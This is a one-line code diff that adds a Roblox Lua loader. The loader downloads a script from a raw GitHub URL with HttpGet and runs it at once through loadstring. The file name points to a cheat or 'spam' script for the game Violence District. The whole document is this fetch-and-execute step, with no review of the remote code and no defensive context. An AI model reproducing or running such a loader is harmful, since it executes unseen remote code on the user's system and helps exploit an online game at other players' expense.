@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/cure-violence-district-spam4-mm0tgazbfeypao.lua"))()
